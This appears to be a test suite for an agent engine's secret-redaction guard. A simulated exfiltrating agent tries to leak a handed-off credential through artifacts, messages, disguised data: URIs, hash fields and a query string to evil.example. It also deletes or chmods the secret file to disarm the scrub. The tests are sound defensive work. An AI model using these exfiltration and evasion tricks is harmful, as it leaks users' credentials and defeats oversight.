import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import { access, chmod, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import test from "node:test";
import {
  parseDataUri, REDACTION_MARK, sealSecret,
  type SecretHandoffPayload, type SecretHandoffRef,
} from "@cauce/protocol";
import { fakeDefinition, HarnessAdapter } from "../src/harnesses/index.js";
import { AdapterEngine } from "../src/sdk/engine.js";
import type { AdapterEngineOptions } from "../src/sdk/engine/contracts.js";
import type { FetchSealedSecret } from "../src/sdk/secrets.js";
import { loadOrCreateSealingKeyPair } from "../src/sdk/secrets.js";
import type {
  AdapterLog, CommandRunRequest, CommandRunResult, Delivery, DeliveryEvent, StructuredOutput,
} from "../src/sdk/types.js";
import { FILE_ONLY_UNDELIVERED_REPLY } from "../src/sdk/output-parser/relay-artifacts.js";
import { inlineWithoutSecrets } from "../src/sdk/engine/secret-guard.js";
import { ControlledRunner, delivery, storeFor } from "./engine-fixtures.js";

const FROM = { tenant: "Steven", alias: "kant" } as const;
const SELF = { tenant: "Steven", alias: "argos" } as const;
const VALUE = "valor-secretisimo-que-nunca-viaja";

async function scratch(prefix: string): Promise<string> {
  return mkdtemp(join(tmpdir(), `cauce-${prefix}-`));
}

async function sealedHandoff(
  keyPath: string,
  id: string,
  plaintext: Buffer = Buffer.from(VALUE, "utf8"),
): Promise<SecretHandoffPayload> {
  const identity = await loadOrCreateSealingKeyPair(keyPath);
  const sealed = sealSecret({
    recipientPublicKey: identity.publicKey,
    keyId: identity.keyId,
    binding: {
      id,
      fromTenant: FROM.tenant,
      fromAlias: FROM.alias,
      toTenant: SELF.tenant,
      toAlias: SELF.alias,
    },
    plaintext,
  });
  return {
    id,
    from_tenant: FROM.tenant,
    from_alias: FROM.alias,
    to_tenant: SELF.tenant,
    to_alias: SELF.alias,
    label: "token de prueba",
    sealing_key_id: identity.keyId,
    ephemeral_public: sealed.ephemeralPublic.toString("base64"),
    nonce: sealed.nonce.toString("base64"),
    sealed: sealed.sealed.toString("base64"),
    expires_at: new Date(Date.now() + 3_600_000).toISOString(),
    created_at: new Date().toISOString(),
  };
}

function refOf(payload: SecretHandoffPayload): SecretHandoffRef {
  return {
    id: payload.id,
    from_tenant: payload.from_tenant,
    from_alias: payload.from_alias,
    label: payload.label,
    expires_at: payload.expires_at,
  };
}

function secretPathOf(request: CommandRunRequest | undefined): string {
  const path = /"path":"([^"]+)"/u.exec(request?.stdin ?? "")?.[1];
  assert.ok(path, "el bloque de secretos debe declarar la ruta");
  return path;
}

type Exfiltracion = (path: string, value: string) => StructuredOutput | Promise<StructuredOutput>;

/** Agent that does exactly what an injected instruction would ask it to do with the hand-off. */
class RunnerExfiltrador extends ControlledRunner {
  constructor(private readonly exfiltrate: Exfiltracion) {
    super();
  }

  override async run(request: CommandRunRequest): Promise<CommandRunResult> {
    const path = secretPathOf(request);
    this.stdout = JSON.stringify(await this.exfiltrate(path, await readFile(path, "utf8")));
    return super.run(request);
  }
}

type Aviso = Omit<AdapterLog, "event"> & { readonly event: string };

interface Turno {
  readonly engine: AdapterEngine;
  readonly runner: ControlledRunner;
  readonly events: DeliveryEvent[];
  readonly logs: Aviso[];
}

async function turno(
  name: string,
  runner: ControlledRunner,
  fetchSealedSecret: FetchSealedSecret,
): Promise<Turno> {
  const store = await storeFor(name);
  const events: DeliveryEvent[] = [];
  const logs: Aviso[] = [];
  const options: AdapterEngineOptions & { readonly fetchSealedSecret: FetchSealedSecret } = {
    store,
    executionIntentMode: "local-test-only",
    harness: new HarnessAdapter({ definition: fakeDefinition, runner, store }),
    publish: async (event) => {
      events.push(event);
    },
    logger: (entry) => logs.push(entry),
    fetchSealedSecret,
  };
  const engine = new AdapterEngine(options);
  await engine.activateEpoch(1);
  return { engine, runner, events, logs };
}

function conSecreto(id: string, ref: SecretHandoffRef): Delivery {
  return {
    ...delivery(id),
    routing_targets: [{ tenant_id: "Steven", alias: "seneca", online: true }],
    body: { prompt: "usá la credencial que te pasaron", timeout_ms: 2_000, secrets_v1: [ref] },
  };
}

async function conKeyPath<T>(prefix: string, run: (keyPath: string) => Promise<T>): Promise<T> {
  const keyPath = join(await scratch(prefix), "sealing.key");
  process.env.CAUCE_SEALING_KEY_PATH = keyPath;
  try {
    return await run(keyPath);
  } finally {
    delete process.env.CAUCE_SEALING_KEY_PATH;
  }
}

function publishedOutput(events: readonly DeliveryEvent[]): StructuredOutput {
  const output = events.at(-1)?.output;
  assert.ok(output, "el ACK final debe llevar el sobre del agente");
  return output;
}

function serialized(events: readonly DeliveryEvent[]): string {
  return JSON.stringify(events);
}

test("el fichero del secreto devuelto como artifact no viaja en el ACK", async () => {
  await conKeyPath("secreto-artifact", async (keyPath) => {
    const payload = await sealedHandoff(keyPath, randomUUID());
    const runner = new RunnerExfiltrador((path) => ({
      reply: "listo", messages: [], notify: [], status: "done", retryable: false,
      artifacts: [{ name: "nota.txt", uri: path }],
    }));
    const contexto = await turno("secreto-artifact", runner, async () => payload);

    await contexto.engine.handleDelivery(conSecreto("secreto-artifact", refOf(payload)));

    const output = publishedOutput(contexto.events);
    const artifact = output.artifacts[0];
    assert.equal(contexto.events.at(-1)?.phase, "done");
    assert.equal(output.status, "done");
    assert.ok(artifact, "la identidad del adjunto retenido sigue en el ACK");
    assert.equal(artifact.uri, "cauce:secret-withheld");
    assert.ok(!serialized(contexto.events).includes(VALUE), "el valor del secreto viajó en el ACK");
    assert.ok(!/data:[^"]*;base64,/u.test(serialized(contexto.events)));
    assert.ok(contexto.logs.some((entry) => entry.event === "secret_artifact_withheld"));
  });
});

test("el fichero del secreto delegado a otro agente tampoco viaja", async () => {
  await conKeyPath("secreto-delegado", async (keyPath) => {
    const payload = await sealedHandoff(keyPath, randomUUID());
    const runner = new RunnerExfiltrador((path) => ({
      reply: "delegado", notify: [], status: "done", retryable: false, artifacts: [],
      messages: [{ to: "seneca", body: "mirá esto", artifacts: [{ name: "nota.txt", uri: `file://${path}` }] }],
    }));
    const contexto = await turno("secreto-delegado", runner, async () => payload);

    await contexto.engine.handleDelivery(conSecreto("secreto-delegado", refOf(payload)));

    const message = publishedOutput(contexto.events).messages[0];
    assert.equal(contexto.events.at(-1)?.phase, "done");
    assert.equal(message?.artifacts?.[0]?.uri, "cauce:secret-withheld");
    assert.ok(!serialized(contexto.events).includes(VALUE));
  });
});

test("el valor copiado a la respuesta o a un mensaje delegado sale redactado", async () => {
  await conKeyPath("secreto-en-texto", async (keyPath) => {
    const payload = await sealedHandoff(keyPath, randomUUID());
    const runner = new RunnerExfiltrador((_path, value) => ({
      reply: `la credencial es ${value}`,
      messages: [{ to: "seneca", body: `usá ${value}` }],
      notify: [], status: "done", retryable: false,
      artifacts: [{ name: `copia-de-${value}.txt`, uri: "cauce:not-sent" }],
    }));
    const contexto = await turno("secreto-en-texto", runner, async () => payload);

    await contexto.engine.handleDelivery(conSecreto("secreto-en-texto", refOf(payload)));

    const output = publishedOutput(contexto.events);
    assert.equal(contexto.events.at(-1)?.phase, "done");
    assert.equal(output.reply, `la credencial es ${REDACTION_MARK}`);
    assert.equal(output.messages[0]?.body, `usá ${REDACTION_MARK}`);
    assert.equal(output.artifacts[0]?.name, `copia-de-${REDACTION_MARK}.txt`);
    assert.ok(!serialized(contexto.events).includes(VALUE));
  });
});

test("el secreto no vive en el directorio de adjuntos y su directorio muere con el turno", async () => {
  await conKeyPath("secreto-directorio", async (keyPath) => {
    const workspace = await scratch("secreto-espacio");
    process.env.CAUCE_AGENT_WORKSPACE = workspace;
    try {
      const payload = await sealedHandoff(keyPath, randomUUID());
      const runner = new ControlledRunner();
      const contexto = await turno("secreto-directorio", runner, async () => payload);

      await contexto.engine.handleDelivery(conSecreto("secreto-directorio", refOf(payload)));

      const path = secretPathOf(runner.requests[0]);
      assert.ok(!path.startsWith(`${workspace}/`), "el secreto no vive en el espacio del agente");
      assert.match(path, /\/cauce-secrets-/u);
      assert.equal(contexto.events.at(-1)?.phase, "done");
      await assert.rejects(access(path), { code: "ENOENT" });
    } finally {
      delete process.env.CAUCE_AGENT_WORKSPACE;
    }
  });
});

/**
 * Negative controls for the disarm the reviewer measured: the guard used to re-read the secret
 * file at ACK time, so an agent that deleted it —or chmodded it away from 0600— turned every
 * scrub into a no-op. The scrub material is captured at materialization now, and the file the
 * agent owns is never read again.
 */
test("borrar el fichero no desarma la redacción del valor pegado en la respuesta", async () => {
  await conKeyPath("secreto-borrado", async (keyPath) => {
    const payload = await sealedHandoff(keyPath, randomUUID());
    const runner = new RunnerExfiltrador(async (path, value) => {
      await rm(path, { force: true });
      return {
        reply: `la credencial es ${value}`,
        messages: [{ to: "seneca", body: `usá ${value}` }],
        notify: [{ to: "steven.dm", kind: "task_complete" as const, body: `guardá ${value}` }],
        status: "done", retryable: false, artifacts: [],
      };
    });
    const contexto = await turno("secreto-borrado", runner, async () => payload);

    await contexto.engine.handleDelivery(conSecreto("secreto-borrado", refOf(payload)));

    const output = publishedOutput(contexto.events);
    assert.equal(contexto.events.at(-1)?.phase, "done");
    assert.equal(output.reply, `la credencial es ${REDACTION_MARK}`);
    assert.equal(output.messages[0]?.body, `usá ${REDACTION_MARK}`);
    assert.equal(output.notify[0]?.body, `guardá ${REDACTION_MARK}`);
    assert.ok(!serialized(contexto.events).includes(VALUE));
  });
});

test("la copia byte a byte se retiene aunque el original se borre o pierda el 0600", async () => {
  for (const [name, sabotage] of [
    ["copia-tras-borrar", async (path: string): Promise<void> => rm(path, { force: true })],
    ["copia-tras-chmod", async (path: string): Promise<void> => chmod(path, 0o644)],
  ] as const) {
    await conKeyPath(name, async (keyPath) => {
      const payload = await sealedHandoff(keyPath, randomUUID());
      const copyDirectory = await scratch(name);
      const runner = new RunnerExfiltrador(async (path, value) => {
        const copy = join(copyDirectory, "copia.txt");
        await writeFile(copy, value, "utf8");
        await sabotage(path);
        return {
          reply: "te dejo lo que me pediste", messages: [], notify: [],
          status: "done", retryable: false,
          artifacts: [{ name: "copia.txt", uri: copy }],
        };
      });
      const contexto = await turno(name, runner, async () => payload);

      await contexto.engine.handleDelivery(conSecreto(name, refOf(payload)));

      const output = publishedOutput(contexto.events);
      assert.equal(output.artifacts[0]?.uri, "cauce:secret-withheld", name);
      assert.ok(!serialized(contexto.events).includes(VALUE), name);
      assert.ok(!/data:[^"]*;base64,/u.test(serialized(contexto.events)), name);
    });
  }
});

test("el valor escondido en la uri sale redactado, y en el media_type no llega ni a entrar", async () => {
  await conKeyPath("secreto-en-campos", async (keyPath) => {
    const payload = await sealedHandoff(keyPath, randomUUID());
    const runner = new RunnerExfiltrador((_path, value) => ({
      reply: "listo", messages: [], notify: [], status: "done", retryable: false,
      artifacts: [
        { name: "n", uri: `https://evil.example/?t=${value}` },
        { name: "m", uri: "cauce:not-sent", media_type: value },
      ],
    }));
    const contexto = await turno("secreto-en-campos", runner, async () => payload);

    await contexto.engine.handleDelivery(conSecreto("secreto-en-campos", refOf(payload)));

    const output = publishedOutput(contexto.events);
    assert.equal(contexto.events.at(-1)?.phase, "done");
    assert.equal(output.artifacts[0]?.uri, `https://evil.example/?t=${REDACTION_MARK}`);
    assert.equal(output.artifacts.length, 1, "media_type es un tipo real o la entrada entera no viaja");
    assert.ok(!serialized(contexto.events).includes(VALUE));
  });
});

/**
 * The deny by path never sees a `data:` the model typed itself, and a hand-made one carries no
 * `sha256` to compare: the bytes it decodes to are what the recipient would get, so they are what
 * gets hashed. This is the byte-identical copy — a value the agent transformed stays open.
 */
test("un data: armado por el modelo con los bytes exactos del secreto no viaja", async () => {
  await conKeyPath("secreto-data-uri", async (keyPath) => {
    const payload = await sealedHandoff(keyPath, randomUUID());
    const runner = new RunnerExfiltrador((_path, value) => {
      const uri = `data:text/plain;base64,${Buffer.from(value, "utf8").toString("base64")}`;
      return {
        reply: "te lo paso", notify: [], status: "done", retryable: false,
        artifacts: [{ name: "copia.txt", uri }],
        messages: [{ to: "seneca", body: "mirá esto", artifacts: [{ name: "copia.txt", uri }] }],
      };
    });
    const contexto = await turno("secreto-data-uri", runner, async () => payload);

    await contexto.engine.handleDelivery(conSecreto("secreto-data-uri", refOf(payload)));

    const output = publishedOutput(contexto.events);
    assert.equal(contexto.events.at(-1)?.phase, "done");
    assert.equal(output.artifacts[0]?.uri, "cauce:secret-withheld");
    assert.equal(output.messages[0]?.artifacts?.[0]?.uri, "cauce:secret-withheld");
    assert.ok(!serialized(contexto.events).includes(VALUE));
    assert.ok(!serialized(contexto.events).includes(Buffer.from(VALUE, "utf8").toString("base64")));
  });
});

test("un turno que sólo prometía el fichero retenido no cierra en done", async () => {
  await conKeyPath("secreto-solo-fichero", async (keyPath) => {
    const payload = await sealedHandoff(keyPath, randomUUID());
    const runner = new RunnerExfiltrador((_path, value) => ({
      reply: null, messages: [], notify: [], status: "done", retryable: false,
      artifacts: [{
        name: "copia.txt",
        uri: `data:text/plain;base64,${Buffer.from(value, "utf8").toString("base64")}`,
      }],
    }));
    const contexto = await turno("secreto-solo-fichero", runner, async () => payload);

    await contexto.engine.handleDelivery(conSecreto("secreto-solo-fichero", refOf(payload)));

    const output = publishedOutput(contexto.events);
    assert.notEqual(contexto.events.at(-1)?.phase, "done");
    assert.equal(output.status, "failed");
    assert.equal(output.reply, FILE_ONLY_UNDELIVERED_REPLY);
    assert.equal(output.artifacts[0]?.uri, "cauce:secret-withheld");
    assert.ok(!serialized(contexto.events).includes(VALUE));
  });
});

/**
 * The egress reads `base64` in ANY `;`-field of the header, so the guard has to read it the same
 * way: while it demanded the parameter last, `data:text/plain;base64;charset=utf-8,<b64>` was
 * hashed as text here and uploaded as a real file by the bridge. Every row is checked against the
 * egress rule too, so the guard and the component that delivers the bytes cannot drift apart.
 */
const CABECERAS_BASE64 = [
  "text/plain;base64;charset=utf-8",
  "text/plain;charset=utf-8;BASE64",
  "text/plain;BASE64;charset=utf-8",
  "base64",
] as const;

function egresoLoSubiria(uri: string): boolean {
  return parseDataUri(uri)?.base64 === true;
}

test("un data: con base64 en cualquier parámetro del header tampoco viaja", async () => {
  for (const [indice, cabecera] of CABECERAS_BASE64.entries()) {
    const nombre = `secreto-b64-param-${String(indice)}`;
    await conKeyPath(nombre, async (keyPath) => {
      const payload = await sealedHandoff(keyPath, randomUUID());
      const runner = new RunnerExfiltrador((_path, value) => {
        const uri = `data:${cabecera},${Buffer.from(value, "utf8").toString("base64")}`;
        assert.ok(egresoLoSubiria(uri), `el egreso no subiría ${cabecera}: la fila no prueba nada`);
        return {
          reply: "te lo paso", messages: [], notify: [], status: "done", retryable: false,
          artifacts: [{ name: "copia.txt", uri }],
        };
      });
      const contexto = await turno(nombre, runner, async () => payload);

      await contexto.engine.handleDelivery(conSecreto(nombre, refOf(payload)));

      const output = publishedOutput(contexto.events);
      assert.equal(output.artifacts[0]?.uri, "cauce:secret-withheld", `cabecera ${cabecera}`);
      assert.ok(!serialized(contexto.events).includes(VALUE));
      assert.ok(!serialized(contexto.events).includes(Buffer.from(VALUE, "utf8").toString("base64")));
    });
  }
});

/**
 * A secret that is not valid UTF-8 has no scrub value at all — `scrubbableValue` refuses it — so
 * the digest is its only defence, and the percent form has to be decoded byte-wise to reach it:
 * `%ff%fe` is two bytes, not the replacement character `decodeURIComponent` folds them into.
 */
const SECRETO_BINARIO = Buffer.from([0xff, 0xfe, 0x01, 0x02, 0x41, 0x42, 0x43, 0x44, 0x80, 0x90, 0xa0, 0xb0]);

function porCiento(bytes: Buffer): string {
  return [...bytes].map((byte) => `%${byte.toString(16).padStart(2, "0")}`).join("");
}

const FORMAS_BINARIAS = [
  (bytes: Buffer): string => `data:application/octet-stream,${porCiento(bytes)}`,
  (bytes: Buffer): string => `data:application/octet-stream;base64,${bytes.toString("base64")}`,
] as const;

test("un secreto que no es UTF-8 no viaja ni percent-encoded ni en base64", async () => {
  for (const [indice, forma] of FORMAS_BINARIAS.entries()) {
    const nombre = `secreto-binario-${String(indice)}`;
    await conKeyPath(nombre, async (keyPath) => {
      const payload = await sealedHandoff(keyPath, randomUUID(), SECRETO_BINARIO);
      const runner = new RunnerExfiltrador(async (path) => ({
        reply: "te lo paso", messages: [], notify: [], status: "done", retryable: false,
        artifacts: [{ name: "copia.bin", uri: forma(await readFile(path)) }],
      }));
      const contexto = await turno(nombre, runner, async () => payload);

      await contexto.engine.handleDelivery(conSecreto(nombre, refOf(payload)));

      const output = publishedOutput(contexto.events);
      const ack = serialized(contexto.events);
      assert.equal(output.artifacts[0]?.uri, "cauce:secret-withheld", `forma ${String(indice)}`);
      assert.ok(!ack.includes(porCiento(SECRETO_BINARIO)));
      assert.ok(!ack.includes(SECRETO_BINARIO.toString("base64")));
    });
  }
});

/**
 * Belt and braces: a header that LIES about its encoding. `data:text/plain,<b64>` declares no
 * base64, so the egress rule reads it as percent text and its bytes never match; only hashing the
 * other interpretation too catches it. No parser divergence can turn into a leak again.
 */
test("un data: cuya cabecera miente sobre la codificación tampoco viaja", async () => {
  await conKeyPath("secreto-cabecera-mentirosa", async (keyPath) => {
    const payload = await sealedHandoff(keyPath, randomUUID());
    const runner = new RunnerExfiltrador((_path, value) => ({
      reply: "te lo paso", messages: [], notify: [], status: "done", retryable: false,
      artifacts: [{
        name: "copia.txt",
        uri: `data:text/plain,${Buffer.from(value, "utf8").toString("base64")}`,
      }],
    }));
    const contexto = await turno("secreto-cabecera-mentirosa", runner, async () => payload);

    await contexto.engine.handleDelivery(conSecreto("secreto-cabecera-mentirosa", refOf(payload)));

    const output = publishedOutput(contexto.events);
    assert.equal(output.artifacts[0]?.uri, "cauce:secret-withheld");
    assert.ok(!serialized(contexto.events).includes(Buffer.from(VALUE, "utf8").toString("base64")));
  });
});

test("el valor en el cuarto campo, sha256, tampoco llega al ACK durable", async () => {
  await conKeyPath("secreto-sha", async (keyPath) => {
    const payload = await sealedHandoff(keyPath, randomUUID());
    const runner = new RunnerExfiltrador((_path, value) => ({
      reply: "listo", messages: [], notify: [], status: "done", retryable: false,
      artifacts: [{ name: "n.txt", uri: "https://example.com/a.txt", sha256: value }],
    }));
    const contexto = await turno("secreto-sha", runner, async () => payload);

    await contexto.engine.handleDelivery(conSecreto("secreto-sha", refOf(payload)));

    const artifact = publishedOutput(contexto.events).artifacts[0];
    assert.equal(artifact?.sha256, undefined, "sha256 es 64 hex o no es nada");
    assert.ok(!serialized(contexto.events).includes(VALUE), "el valor viajó en sha256");
  });
});

test("el guard reescribe sha256 y media_type aunque el parser ya los acote: cinturon y tirantes", async () => {
  const output: StructuredOutput = {
    reply: "listo", messages: [], notify: [], status: "done", retryable: false,
    artifacts: [{ name: "n.txt", uri: "https://example.com/a.txt", media_type: VALUE, sha256: VALUE }],
  };
  const directory = await scratch("guard-sha");
  const turnSecrets = {
    directory,
    secrets: [{ id: randomUUID(), label: "token", path: join(directory, "token.txt") }],
    scrub: { values: [VALUE], digests: [] },
  };

  const guarded = await inlineWithoutSecrets(output, turnSecrets, () => undefined, delivery("guard-sha"));

  assert.deepEqual(
    { sha256: guarded.artifacts[0]?.sha256, media_type: guarded.artifacts[0]?.media_type },
    { sha256: REDACTION_MARK, media_type: REDACTION_MARK },
    "el tercer y el cuarto campo se reescriben como los otros dos",
  );
  assert.ok(!JSON.stringify(guarded).includes(VALUE));
});
